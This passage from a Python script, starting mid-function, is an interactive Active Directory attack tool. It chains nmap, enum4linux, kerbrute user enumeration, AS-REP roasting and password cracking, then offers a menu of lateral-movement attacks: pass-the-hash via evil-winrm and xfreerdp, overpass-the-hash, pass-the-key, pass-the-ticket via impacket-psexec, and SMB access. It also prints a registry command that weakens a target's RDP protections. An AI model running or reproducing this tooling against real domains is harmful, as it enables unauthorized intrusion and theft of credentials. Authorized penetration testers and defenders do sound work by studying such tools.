                username = creds['username']
                nthash = creds['nthash']
            else:
                username = input("Enter username: ").strip()
                nthash = input("Enter NTLM hash: ").strip()
            cmd = ["evil-winrm", "-i", creds['ip'], "-u", username, "-H", nthash]
            run_command(cmd, timeout=300, capture_output=False)
            print(f"{YELLOW}[*] evil-winrm session ended. Returning to menu...{RESET}")

        # ========== OPTION E: EVIL-WINRM CREDS ==========
        elif choice == 'E':
            print(f"\n{CYAN}[OPTION E] evil-winrm with credentials{RESET}")
            cmd = [
                "evil-winrm",
                "-i", creds['ip'],
                "-u", creds['username'],
                "-p", creds['password']
            ]
            run_command(cmd, timeout=300, capture_output=False)
            print(f"{YELLOW}[*] evil-winrm session ended. Returning to menu...{RESET}")

        # ========== OPTION F: RDP ==========
        elif choice == 'F':
            print(f"\n{CYAN}[OPTION F] rdesktop (RDP){RESET}")
            cmd = [
                "rdesktop",
                creds['ip'],
                "-u", creds['username'],
                "-d", creds['domain'],
                "-p", creds['password']
            ]
            run_command(cmd, timeout=300, capture_output=False)
            print(f"{YELLOW}[*] RDP session ended. Returning to menu...{RESET}")

        # ========== OPTION G: SMBCLIENT LIST SHARES ==========
        elif choice == 'G':
            print(f"\n{CYAN}[OPTION G] smbclient list shares{RESET}")
            cmd = [
                "smbclient",
                "-L", f"//{creds['ip']}",
                "-U", f"{creds['username']}%{creds['password']}"
            ]
            run_command(cmd, timeout=60, capture_output=False)

        # ========== OPTION H: SMBCLIENT SESSION ==========
        elif choice == 'H':
            print(f"\n{CYAN}[OPTION H] smbclient interactive session{RESET}")
            share = input("Enter share name : ").strip()
            cmd = [
                "smbclient",
                f"//{creds['ip']}/{share}",
                "-U", f"{creds['username']}%{creds['password']}"
            ]
            run_command(cmd, timeout=300, capture_output=False)
            print(f"{YELLOW}[*] smbclient session ended. Returning to menu...{RESET}")

        # ========== OPTION I: OVERPASS-THE-HASH ==========
        elif choice == 'I':
            print(f"\n{CYAN}[OPTION I] Overpass-the-Hash (impacket-getTGT){RESET}")
            if creds.get('nthash'):
                use_loaded = input(f"Use {creds['username']} with loaded hash? (yes/no): ").strip().lower()
                if use_loaded == 'yes':
                    username = creds['username']
                    hash_str = f":{creds['nthash']}"
                else:
                    username = input("Enter username: ").strip()
                    nthash = input("Enter NTLM hash: ").strip()
                    hash_str = f":{nthash}"
            else:
                username = input("Enter username: ").strip()
                hash_str = input("Enter hash (format :NTHASH): ").strip()
            cmd = [
                "impacket-getTGT",
                f"{creds['domain']}/{username}",
                "-hashes", hash_str,
                "-dc-ip", creds['ip']
            ]
            output, code = run_command(cmd, timeout=60, capture_output=True, show_live=True)
            ccache_match = re.search(r'(\S+\.ccache)', output)
            if ccache_match:
                ccache_file = ccache_match.group(1)
                print(f"{GREEN}[+] Ticket saved: {ccache_file}{RESET}")
                os.environ['KRB5CCNAME'] = ccache_file
                print(f"{YELLOW}[*] Exported KRB5CCNAME={ccache_file}{RESET}")

        # ========== OPTION J: PASS-THE-KEY ==========
        elif choice == 'J':
            print(f"\n{CYAN}[OPTION J] Pass-the-Key (AES key){RESET}")
            username = input("Enter username: ").strip()
            key_type = input("Key type (AES128/AES256/DES): ").strip()
            key_value = input(f"Enter {key_type} key: ").strip()
            cmd = [
                "impacket-getTGT",
                f"{creds['domain']}/{username}",
                "-aesKey", key_value,
                "-dc-ip", creds['ip']
            ]
            run_command(cmd, timeout=60, capture_output=True, show_live=True)

        # ========== OPTION K: EXPORT TICKET ==========
        elif choice == 'K':
            print(f"\n{CYAN}[OPTION K] Export KRB5CCNAME ticket{RESET}")
            ticket_path = input("Enter path to .ccache ticket: ").strip()
            if os.path.exists(ticket_path):
                os.environ['KRB5CCNAME'] = ticket_path
                print(f"{GREEN}[+] Exported KRB5CCNAME={ticket_path}{RESET}")
            else:
                print(f"{RED}[!] File not found: {ticket_path}{RESET}")

        # ========== OPTION L: PASS-THE-TICKET ==========
        elif choice == 'L':
            print(f"\n{CYAN}[OPTION L] Pass-the-Ticket (impacket-psexec){RESET}")
            if 'KRB5CCNAME' not in os.environ:
                print(f"{YELLOW}[!] No ticket in KRB5CCNAME. Run Option K first.{RESET}")
                ticket_path = input("Enter ticket path: ").strip()
                if os.path.exists(ticket_path):
                    os.environ['KRB5CCNAME'] = ticket_path
                else:
                    print(f"{RED}[!] Ticket not found{RESET}")
                    continue
            username = input(f"Username (Enter for {creds['username']}): ").strip() or creds['username']
            cmd = [
                "impacket-psexec",
                f"{creds['domain']}/{username}@{creds['domain']}",
                "-k", "-no-pass",
                "-dc-ip", creds['ip'],
                "-target-ip", creds['ip']
            ]
            run_command(cmd, timeout=300, capture_output=False)
            print(f"{YELLOW}[*] psexec session ended. Returning to menu...{RESET}")

        # ========== OPTION M: XFREERDP (show reg fix first) ==========
        elif choice == 'M':
            print(f"\n{CYAN}[OPTION M] xfreerdp Pass-the-Hash (/restrictedAdmin){RESET}")

            print(f"\n{YELLOW}*** IMPORTANT: Restricted Admin Mode must be enabled on the target ***{RESET}")
            print(f"{GREEN}If you already have a command‑line shell on the target (e.g., via Impacket's psexec.py or wmiexec.py using the same hash), you can manually enable it with:{RESET}")
            print(f"{GREEN}  reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f{RESET}")
            print(f"{YELLOW}Without this, xfreerdp with /restrictedAdmin will likely fail.{RESET}")
            input(f"{CYAN}Press Enter after you have enabled Restricted Admin Mode (or to attempt connection anyway)...{RESET}")

            if not creds.get('nthash'):
                print(f"{YELLOW}[!] No NTLM hash loaded. Please provide one.{RESET}")
                hash_input = input("Enter hash (LM:NT or NTHASH only): ").strip()
                lm, nt = parse_manual_hash(hash_input)
                if nt:
                    creds['nthash'] = nt
                    creds['lmhash'] = lm
                    # *** Add hash-only entry (no password) ***
                    add_credential({
                        'username': creds['username'],
                        'domain': creds['domain'],
                        'password': '',
                        'lmhash': lm,
                        'nthash': nt
                    })
                else:
                    if re.match(r'^[a-f0-9]{32}$', hash_input, re.IGNORECASE):
                        creds['nthash'] = hash_input
                        add_credential({
                            'username': creds['username'],
                            'domain': creds['domain'],
                            'password': '',
                            'lmhash': '',
                            'nthash': hash_input
                        })
                    else:
                        print(f"{RED}[!] Invalid hash{RESET}")
                        continue

            username = input(f"Username (Enter for {creds['username']}): ").strip() or creds['username']
            print(f"\n{YELLOW}[*] Attempting xfreerdp connection...{RESET}")
            cmd = [
                "xfreerdp",
                f"/v:{creds['ip']}",
                f"/u:{username}",
                f"/pth:{creds['nthash']}",
                "/restrictedAdmin"
            ]
            output, code = run_command(cmd, timeout=300, capture_output=False, show_live=False)
            if code != 0:
                print(f"\n{RED}[!] xfreerdp failed. This is often due to Restricted Admin Mode not being enabled.{RESET}")
                print(f"{YELLOW}   If you haven't yet, run the registry command on the target and try again.{RESET}")
            else:
                print(f"{GREEN}[+] xfreerdp session completed.{RESET}")

        # ========== RETURN ==========
        elif choice == 'R':
            print(f"{YELLOW}[!] Returning to main menu...{RESET}")
            kill_options_window()
            break

        else:
            print(f"{RED}[!] Invalid option{RESET}")

# ---------- KERBRUTE & ROASTING ----------
def perform_kerbrute_and_roasting(target_ip, domain):
    print(f"\n{CYAN}[STEP 5] User Enumeration via Kerbrute{RESET}")
    userlist_path = ""
    while not userlist_path:
        userlist_path = input("Enter path to userlist file (e.g., userlist.txt): ").strip()
        if not os.path.exists(userlist_path):
            print(f"{RED}[!] File not found. Please provide a valid path.{RESET}")
            userlist_path = ""

    print(f"{YELLOW}[!] Running Kerbrute to find valid users...{RESET}")
    kerbrute_cmd = ["kerbrute", "userenum", "-d", domain, userlist_path, "--dc", target_ip]
    kerbrute_output, kerbrute_code = run_command(kerbrute_cmd, timeout=300, capture_output=True, show_live=True)

    valid_users = extract_users_from_kerbrute_output(kerbrute_output)

    if not valid_users:
        print(f"{RED}[!] No valid users found via Kerbrute. Cannot proceed with AS-REP roasting.{RESET}")
        sys.exit(0)

    print(f"\n{GREEN}[+] Successfully found {len(valid_users)} valid users:")
    for i, user in enumerate(valid_users):
        print(f"    {i+1}. {user}")

    print(f"\n{CYAN}[STEP 6] AS-REP Roasting (Impacket GetNPUsers){RESET}")
    tgt_users = []
    tgt_hashes = {} 

    for user in valid_users:
        print(f"{YELLOW}[!] Testing user: {user}@{domain}{RESET}")
        cmd = ["impacket-GetNPUsers", f"{domain}/{user}", "-no-pass", "-request"]
        output, code = run_command(cmd, timeout=10, capture_output=True)
        
        if "$krb5asrep" in output:
            print(f"{GREEN}[+] Found vulnerable user: {user}{RESET}")
            for line in output.split('\n'):
                if line.startswith("$krb5asrep"):
                    tgt_hashes[user] = line.strip()
                    tgt_users.append(user)
                    break
        elif "User does not have AS-REP set" not in output:
            pass

    if not tgt_users:
        print(f"{RED}[!] No users are vulnerable to AS-REP roasting. Exiting.{RESET}")
        sys.exit(0)

    selected_user = None
    if len(tgt_users) > 1:
        print(f"\n{YELLOW}[!] Multiple users vulnerable to AS-REP roasting: {tgt_users}{RESET}")
        print("Please select a user to crack:")
        for i, user in enumerate(tgt_users):
            print(f"    {i+1}. {user}")
        while True:
            choice = input("Enter the number of the user to crack: ").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(tgt_users):
                selected_user = tgt_users[int(choice) - 1]
                break
            else:
                print(f"{RED}[!] Invalid selection.{RESET}")
    else:
        selected_user = tgt_users[0]
        print(f"\n{GREEN}[+] Only one vulnerable user found: {selected_user}{RESET}")
        confirm = input(f"Do you want to proceed with cracking the password for '{selected_user}'? (yes/no): ").strip().lower()
        if confirm != 'yes':
            print(f"{RED}[!] User aborted cracking. Exiting.{RESET}")
            sys.exit(0)

    hash_string = tgt_hashes[selected_user]

    wordlist_path = ""
    while not wordlist_path:
        wp = input("Enter path to password wordlist (or press Enter for default small list): ").strip()
        if wp == "":
            wordlist_path = create_default_wordlist()
            print(f"{YELLOW}[!] Using generated default wordlist.{RESET}")
        elif os.path.exists(wp):
            wordlist_path = wp
        else:
            print(f"{RED}[!] Wordlist file not found.{RESET}")

    password = run_cracking_job(hash_string, selected_user, wordlist_path)

    if not password:
        print(f"\n{RED}[!] Cracking failed. Exiting.{RESET}")
        sys.exit(0)

    return selected_user, password

# ---------- MAIN ----------
def main():
    print_banner()
    check_dependencies()

    print(f"\n{CYAN}[STEP 1] Target Configuration{RESET}")
    target_ip = ""
    while not target_ip:
        target_ip = input("Enter Target IP Address: ").strip()
        try:
            socket.inet_aton(target_ip)
        except socket.error:
            print(f"{RED}[!] Invalid IP address.{RESET}")
            target_ip = ""

    domain = None
    know_domain = input(f"\n{CYAN}[?] Do you know the domain name? (yes/no): {RESET}").strip().lower()
    
    if know_domain in ['yes', 'y']:
        domain = input("Enter Domain Name (e.g., something.local): ").strip()
        while not domain:
            print(f"{RED}[!] Domain name cannot be empty{RESET}")
            domain = input("Enter Domain Name (e.g., something.local): ").strip()
        update_hosts_file(target_ip, domain)
        
        have_creds = input(f"\n{CYAN}[?] Do you have credentials? (yes/no): {RESET}").strip().lower()
        if have_creds in ['yes', 'y']:
            username = input("Enter Username: ").strip()
            password = input("Enter Password: ").strip()
            creds = {
                'username': username,
                'password': password,
                'domain': domain,
                'ip': target_ip,
                'nthash': None,
                'lmhash': None
            }
            add_credential({
                'username': username,
                'domain': domain,
                'password': password,
                'lmhash': '',
                'nthash': ''
            })
            print(f"\n{GREEN}[+] Credentials configured. Launching attack menu...{RESET}")
            credential_attack_menu(creds)
            print(f"\n{GREEN}[+] Tool execution complete.{RESET}")
            return
        
        print(f"\n{CYAN}[*] Domain known but no credentials provided. Skipping Nmap & Enum4Linux...{RESET}")
        selected_user, password = perform_kerbrute_and_roasting(target_ip, domain)
        creds = {
            'username': selected_user,
            'password': password,
            'domain': domain,
            'ip': target_ip,
            'nthash': None,
            'lmhash': None
        }
        add_credential({
            'username': selected_user,
            'domain': domain,
            'password': password,
            'lmhash': '',
            'nthash': ''
        })
        credential_attack_menu(creds)
        print(f"\n{GREEN}[+] Tool execution complete.{RESET}")
        return

    # Normal flow
    print(f"\n{CYAN}[STEP 2] Nmap Full Port Scan & Service Detection{RESET}")
    nmap_cmd = ["nmap", "-sV", "-sC", target_ip]
    nmap_output, nmap_code = run_command(nmap_cmd, timeout=600, capture_output=True, show_live=True)
    if nmap_code != 0 and "Completed" not in nmap_output:
        print(f"{RED}[!] Nmap scan failed or was interrupted. Proceeding anyway if partial data exists.{RESET}")
    
    essential_ports = ["88", "389", "445", "636"]
    found_ports = []
    for port in essential_ports:
        if f"{port}/tcp" in nmap_output or f"{port}/udp" in nmap_output:
            found_ports.append(port)
    if not found_ports:
        print(f"{RED}[!] Warning: No essential AD ports (88, 389, 445, 636) found.{RESET}")
        continue_choice = input("Do you want to continue anyway? (y/n): ").strip().lower()
        if continue_choice != 'y':
            sys.exit(0)

    print(f"\n{CYAN}[STEP 3] Enum4Linux Enumeration{RESET}")
    enum_cmd = ["enum4linux", "-a", target_ip]
    enum_output, enum_code = run_command(enum_cmd, timeout=300, capture_output=True, show_live=True)
    
    print(f"\n{CYAN}[STEP 4] Extracting Domain Information{RESET}")
    domain = None
    domain_match = re.search(r"Domain: ([a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+)", enum_output)
    if domain_match:
        domain = domain_match.group(1)
        print(f"{GREEN}[+] Domain found via Enum4Linux: {domain}{RESET}")
    if not domain:
        domain = extract_domain_from_ldap(target_ip)
    if not domain:
        domain = input("Please enter the Domain Name manually (e.g., something.local): ").strip()
        if not domain:
            print(f"{RED}[!] Domain name is required. Exiting.{RESET}")
            sys.exit(1)

    update_hosts_file(target_ip, domain)

    selected_user, password = perform_kerbrute_and_roasting(target_ip, domain)

    creds = {
        'username': selected_user,
        'password': password,
        'domain': domain,
        'ip': target_ip,
        'nthash': None,
        'lmhash': None
    }
    add_credential({
        'username': selected_user,
        'domain': domain,
        'password': password,
        'lmhash': '',
        'nthash': ''
    })
    credential_attack_menu(creds)
    print(f"\n{GREEN}[+] Tool execution complete.{RESET}")

if __name__ == "__main__":
    main()
